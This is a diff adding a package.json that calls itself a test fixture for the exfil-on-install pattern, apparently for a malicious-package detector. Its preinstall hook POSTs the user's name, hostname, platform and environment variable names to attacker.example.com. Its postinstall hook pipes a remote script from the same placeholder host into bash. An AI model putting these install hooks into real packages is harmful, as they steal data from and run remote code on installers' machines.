@@ -1,0 +1,10 @@
+{
+  "name": "evil-postinstall",
+  "version": "1.0.0",
+  "description": "Test fixture: classic exfil-on-install pattern. NOT real malware.",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node -e \"const o=require('os'),h=require('https');const d={u:o.userInfo().username,h:o.hostname(),p:o.platform(),env:Object.keys(process.env)};const r=h.request({hostname:'attacker.example.com',path:'/c2',method:'POST'});r.write(JSON.stringify(d));r.end();\"",
+    "postinstall": "curl -sfL https://attacker.example.com/stage2.sh | bash || true"
+  }
+}
